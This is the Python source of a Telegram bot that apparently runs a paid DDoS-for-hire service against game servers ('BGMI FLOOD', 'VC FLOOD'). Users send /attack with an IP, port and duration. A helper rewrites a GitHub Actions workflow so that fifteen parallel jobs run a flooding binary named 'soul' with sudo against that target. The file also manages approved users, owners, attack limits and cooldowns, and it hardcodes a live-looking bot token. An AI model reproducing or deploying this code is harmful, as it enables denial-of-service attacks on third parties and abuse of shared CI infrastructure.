import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

from keep_alive import keep_alive
keep_alive()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constants
BOT_TOKEN = "8499935979:AAEnf4tWEWwCRDjoYuRajH9KZR54FREAvVU"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [6761752864]
OWNER_IDS = [6820056931]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6

# State Variables
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 60  # Updated to 1 minute (60 seconds)
MAINTENANCE_MODE = False
MAX_ATTACKS = 40        # Kept at 40
user_attack_counts = {}  

# Data Persistence Functions
def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            return set(users_data) if users_data else set(ADMIN_IDS)
    except FileNotFoundError:
        return set(ADMIN_IDS)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners_dict = {}
        for admin_id in ADMIN_IDS:
            owners_dict[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        return owners_dict

def save_owners(owners_data):
    with open('owners.json', 'w') as f:
        json.dump(owners_data, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 60) # Default to 60s
    except FileNotFoundError:
        return 60

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(count):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": count}, f, indent=2)

# Load Initial Data
approved_users = load_approved_users()
owners = load_owners()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()

# Helper Functions
def is_owner(user_id):
    return str(user_id) in owners

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str]['expiry']
        if expiry == "LIFETIME": return True
        if time.time() < float(expiry): return True
        del approved_users[user_id_str]
        save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    if MAINTENANCE_MODE:
        return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**"
    
    user_id_str = str(user_id)
    if user_attack_counts.get(user_id_str, 0) >= MAX_ATTACKS:
        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ({MAX_ATTACKS})**"
    
    if current_attack is not None:
        return False, "⚠️ **ᴇʀʀᴏʀ: ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇs ᴏʀ 1 ᴍɪɴᴜᴛᴇ ᴄᴏᴏʟᴅᴏᴡɴ."
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining = int(cooldown_until - current_time)
        return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**: `{remaining}` sᴇᴄᴏɴᴅs."
    
    return True, "✅ ʀᴇᴀᴅʏ"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "ɢᴀᴍᴇ"
    elif ip.startswith(('99', '96')): # Replaced 15 with 99
        return None, "⚠️ ɪɴᴠᴀʟɪᴅ ɪᴘ - ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ"
    else:
        return "BGMI FLOOD", "ɢᴀᴍᴇ"

def is_valid_ip(ip):
    return not ip.startswith(('99', '96')) # Replaced 15 with 99

# GitHub Workflow Update Logic
def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        file_content = repo.get_contents(YML_FILE_PATH)
        repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file_content.sha)
        return True
    except Exception:
        return False

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(
        f"🤖 **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **ᴍᴀx ᴀᴛᴛᴀᴄᴋs:** {MAX_ATTACKS}\n"
        f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ:** 1 ᴍɪɴᴜᴛᴇ\n"
        f"🚫 **ʀᴇsᴛʀɪᴄᴛᴇᴅ ɪᴘs:** '99', '96'\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴜsᴇ /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> ᴛᴏ sᴛᴀʀᴛ."
    )

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id): return
    if not context.args:
        await update.message.reply_text("ᴜsᴀɢᴇ: /setmaxattack <ɴᴜᴍʙᴇʀ>")
        return
    try:
        global MAX_ATTACKS
        MAX_ATTACKS = int(context.args[0])
        save_max_attacks(MAX_ATTACKS)
        await update.message.reply_text(f"✅ **ᴍᴀx ᴀᴛᴛᴀᴄᴋs sᴇᴛ ᴛᴏ {MAX_ATTACKS}**")
    except ValueError:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.")

async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id): return
    if not context.args:
        await update.message.reply_text("ᴜsᴀɢᴇ: /setcooldown <sᴇᴄᴏɴᴅs>")
        return
    try:
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = int(context.args[0])
        save_cooldown(COOLDOWN_DURATION)
        await update.message.reply_text(f"✅ **ᴄᴏᴏʟᴅᴏᴡɴ sᴇᴛ ᴛᴏ {COOLDOWN_DURATION} sᴇᴄᴏɴᴅs**")
    except ValueError:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("❌ **ɴᴏ ᴀᴄᴄᴇss**")
        return
    
    can_start, msg = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg)
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>")
        return

    ip, port, duration = context.args
    if not is_valid_ip(ip):
        await update.message.reply_text("⚠️ **ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ**")
        return

    # Attack Start Logic
    global current_attack
    current_attack = {"ip": ip, "start_time": time.time()}
    
    # Update user attack count
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    
    await update.message.reply_text(f"🚀 **ᴀᴛᴛᴀᴄᴋ sᴇɴᴛ ᴛᴏ {ip}:{port}**\n⏳ ᴄᴏᴏʟᴅᴏᴡɴ: 1 ᴍɪɴᴜᴛᴇ")
    
    # Simulate completion (usually handled by workflow monitor)
    def end_attack():
        time.sleep(int(duration))
        global current_attack, cooldown_until
        current_attack = None
        cooldown_until = time.time() + COOLDOWN_DURATION
    
    threading.Thread(target=end_attack).start()

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    
    print("🤖 **ʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ...**")
    application.run_polling()

if __name__ == '__main__':
    main()
